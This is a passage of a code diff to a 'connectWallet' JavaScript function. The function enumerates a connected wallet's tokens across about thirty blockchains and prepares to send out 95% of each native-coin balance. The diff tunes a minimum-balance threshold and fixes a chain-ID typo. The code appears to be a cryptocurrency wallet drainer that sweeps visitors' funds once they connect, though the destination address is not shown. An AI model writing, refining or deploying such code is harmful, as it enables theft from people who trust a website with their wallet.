                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               tokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -2925,7 +2963,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ETH`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ETH`);
           
@@ -2965,7 +3003,7 @@ async function connectWallet() {
                       for (let token of bscTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               bnbTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3003,7 +3041,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BNB`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BNB`);
           
@@ -3044,7 +3082,7 @@ async function connectWallet() {
                       for (let token of arbTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               arbTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3082,7 +3120,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARB`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARB`);
           
@@ -3121,7 +3159,7 @@ async function connectWallet() {
                       for (let token of opTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               opTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3159,7 +3197,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OP`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OP`);
           
@@ -3199,7 +3237,7 @@ async function connectWallet() {
                       for (let token of arbnovaTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               arbnovaTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3237,7 +3275,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ARBNOVA`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ARBNOVA`);
           
@@ -3276,7 +3314,7 @@ async function connectWallet() {
                       for (let token of baseTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               baseTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3314,7 +3352,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BASE`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BASE`);
           
@@ -3353,7 +3391,7 @@ async function connectWallet() {
                       for (let token of zkTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               zkTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3391,7 +3429,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} ZKSYNC`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} ZKSYNC`);
           
@@ -3430,7 +3468,7 @@ async function connectWallet() {
                       for (let token of polyTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               polyTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3468,7 +3506,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGON`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGON`);
           
@@ -3496,7 +3534,7 @@ async function connectWallet() {
           
           
                   ////POLYGONEVM
-                    case polygonevm.chaindId:
+                    case polygonevm.chainId:
                       const polyevmTokens = await fetchPOLYGONEVMTokens(address);
           
                       // Message to sign
@@ -3508,7 +3546,7 @@ async function connectWallet() {
                       for (let token of polyevmTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               polyevmTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3546,7 +3584,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} POLYGONEVM`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} POLYGONEVM`);
           
@@ -3586,7 +3624,7 @@ async function connectWallet() {
                       for (let token of blastTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               blastTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3624,7 +3662,7 @@ async function connectWallet() {
                           const etherBalance = await provider.getBalance(address)
                           console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} BLAST`);
              
-                          if(!etherBalance.eq(0)){
+                          if(etherBalance.gte(minimumBalance)){
                             const amountToSend = etherBalance.mul(95).div(100);
                           console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BLAST`);
              
@@ -3664,7 +3702,7 @@ async function connectWallet() {
                       for (let token of scrollTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               scrollTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3702,7 +3740,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SCROLL`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SCROLL`);
           
@@ -3741,7 +3779,7 @@ async function connectWallet() {
                       for (let token of metisTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               metisTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3779,7 +3817,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} METIS`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} METIS`);
           
@@ -3803,7 +3841,7 @@ async function connectWallet() {
                           console.error('Error transferring METIS:', error);
                           
                      }
-                          break;
+                        break;
           
                     //MANTA      
                     case manta.chainId:
@@ -3818,7 +3856,7 @@ async function connectWallet() {
                       for (let token of mantaTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               mantaTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3856,7 +3894,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTA`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTA`);
           
@@ -3895,7 +3933,7 @@ async function connectWallet() {
                       for (let token of fantomTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               fantomTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -3933,7 +3971,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} FANTOM`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} FANTOM`);
           
@@ -3972,7 +4010,7 @@ async function connectWallet() {
                       for (let token of gnosisTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               gnosisTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4010,7 +4048,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} GNOSIS`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} GNOSIS`);
           
@@ -4049,7 +4087,7 @@ async function connectWallet() {
                       for (let token of lineaTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               lineaTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4087,7 +4125,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} LINEA`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} LINEA`);
           
@@ -4127,7 +4165,7 @@ async function connectWallet() {
                       for (let token of celoTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               celoTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4165,7 +4203,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CELO`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CELO`);
           
@@ -4205,7 +4243,7 @@ async function connectWallet() {
                       for (let token of avaTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               avaTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4243,7 +4281,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AVALANCHE`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AVALANCHE`);
           
@@ -4282,7 +4320,7 @@ async function connectWallet() {
                       for (let token of opbnbTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               opbnbTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4320,7 +4358,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OPBNB`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OPBNB`);
           
@@ -4359,7 +4397,7 @@ async function connectWallet() {
                       for (let token of okxTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               okxTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4397,7 +4435,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} OKX`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OKX`);
           
@@ -4437,7 +4475,7 @@ async function connectWallet() {
                       for (let token of mantleTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               mantleTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4475,7 +4513,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MANTLE`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTLE`);
           
@@ -4514,7 +4552,7 @@ async function connectWallet() {
                       for (let token of aurTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               aurTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4552,7 +4590,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} AURORA`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AURORA`);
           
@@ -4592,7 +4630,7 @@ async function connectWallet() {
                       for (let token of cronosTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               cronosTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4630,7 +4668,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CRONOS`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CRONOS`);
           
@@ -4668,7 +4706,7 @@ async function connectWallet() {
                       for (let token of klaytnTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               klaytnTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4705,7 +4743,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} KLAYTN`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} KLAYTN`);
           
@@ -4746,7 +4784,7 @@ async function connectWallet() {
                       for (let token of platTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               platTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4784,7 +4822,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} PLATON`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} PLATON`);
           
@@ -4824,7 +4862,7 @@ async function connectWallet() {
                       for (let token of harTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               harTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4862,7 +4900,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HARMONY`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HARMONY`);
           
@@ -4902,7 +4940,7 @@ async function connectWallet() {
                       for (let token of hecoTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               hecoTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -4940,7 +4978,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} HECO`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HECO`);
           
@@ -4980,7 +5018,7 @@ async function connectWallet() {
                       for (let token of bchTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               bchTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -5018,7 +5056,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} SMARTBCH`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SMARTBCH`);
           
@@ -5058,7 +5096,7 @@ async function connectWallet() {
                       for (let token of confluxTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               confluxTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -5096,7 +5134,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} CONFLUX`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CONFLUX`);
           
@@ -5136,7 +5174,7 @@ async function connectWallet() {
                       for (let token of merlinTokens) {
                           const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                           const balance = await tokenContract.balanceOf(address);
-                          if (!balance.eq(0)) { //Only add tokens with non-zero balances
+                          if (balance.gte(minimumBalance)) { //Only add tokens with non-zero balances
                               merlinTokenDetails.push({
                                   contract: tokenContract,
                                   balance: balance,
@@ -5174,7 +5212,7 @@ async function connectWallet() {
                        const etherBalance = await provider.getBalance(address)
                        console.log(`Current balance: ${ethers.utils.formatEther(etherBalance)} MERLIN`);
           
-                       if(!etherBalance.eq(0)){
+                       if(etherBalance.gte(minimumBalance)){
                          const amountToSend = etherBalance.mul(95).div(100);
                        console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MERLIN`);
           
